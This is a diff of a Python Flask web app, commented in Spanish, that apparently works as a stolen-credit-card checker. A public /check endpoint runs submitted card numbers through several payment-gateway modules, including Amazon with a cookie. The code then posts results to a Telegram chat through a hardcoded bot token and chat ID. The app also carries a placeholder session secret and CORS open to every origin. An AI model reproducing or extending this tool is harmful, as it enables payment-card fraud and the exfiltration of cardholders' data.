@@ -1,17 +1,15 @@
+import os
+import asyncio
 from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template, flash
 from flask_cors import CORS
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import generate_password_hash, check_password_hash
 import requests as req
-import asyncio
-import os
 import tec, red, em, amazon
 
 app = Flask(__name__)
-app.secret_key = 'tu_secreto_super_seguro'  # Cambiar a algo fuerte y secreto
-
-# CORS abierto a cualquier origen (público)
-CORS(app, resources={r"/*": {"origins": "*"}})
+app.secret_key = 'tu_secreto_super_seguro'  # Cambia esto a algo seguro
+CORS(app, resources={r"/*": {"origins": "*"}})  # CORS abierto para evitar bloqueos
 
 # Configuración base de datos SQLite
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
@@ -39,18 +37,17 @@ class Key(db.Model):
 def create_tables():
     db.create_all()
 
-# Rutas para HTML/CSS estáticos
+# Rutas
 @app.route('/')
 def index():
     if 'user_id' in session:
         return redirect(url_for('dashboard'))
-    return render_template('index.html')  # Aquí se muestra el login
+    return render_template('index.html')
 
 @app.route('/style.css')
 def style():
     return send_from_directory('.', 'style.css')
 
-# Registro
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
@@ -76,7 +73,6 @@ def register():
         return redirect(url_for('index'))
     return render_template('register.html')
 
-# Login (solo POST)
 @app.route('/login', methods=['POST'])
 def login():
     username = request.form['username'].strip()
@@ -91,38 +87,32 @@ def login():
         flash('Usuario o contraseña incorrectos.', 'error')
         return redirect(url_for('index'))
 
-# Dashboard protegido
 @app.route('/dashboard')
 def dashboard():
     if 'user_id' not in session:
         return redirect(url_for('index'))
     return render_template('checker.html', username=session['username'])
 
-# Logout
 @app.route('/logout')
 def logout():
     session.clear()
     return redirect(url_for('index'))
 
-# Telegram bot token y chat
+# Telegram
 TELEGRAM_BOT_TOKEN = '7549342155:AAGTeGoCr6s56nckuq8KEDDB7aCKiU5BW3Y'
 TELEGRAM_CHAT_ID = '-1002762787906'
 
 def enviar_telegram(mensaje):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        'chat_id': TELEGRAM_CHAT_ID,
-        'text': mensaje,
-        'parse_mode': 'Markdown'
-    }
+    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': mensaje, 'parse_mode': 'Markdown'}
     try:
         req.post(url, data=data)
     except Exception as e:
         print(f"Error enviando Telegram: {e}")
 
-# Endpoint para check tarjetas (PÚBLICO, sin sesión)
+# Endpoint /check SÍNCRONO para evitar problemas con async en Flask
 @app.route('/check', methods=['POST'])
-async def check_card():
+def check_card():
     data = request.get_json()
     cc = data.get('cc')
     gateway = data.get('gateway', 'TEC')
@@ -130,11 +120,11 @@ async def check_card():
 
     try:
         if gateway == 'TEC':
-            result = await tec.process_card(cc)
+            result = asyncio.run(tec.process_card(cc))
         elif gateway == 'RED':
-            result = await red.process_card(cc)
+            result = asyncio.run(red.process_card(cc))
         elif gateway == 'EM':
-            result = await em.process_card(cc)
+            result = asyncio.run(em.process_card(cc))
         elif gateway == 'AMAZON':
             result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
         else:
@@ -145,7 +135,6 @@ async def check_card():
             enviar_telegram(mensaje_telegram)
 
         return jsonify(result)
-
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
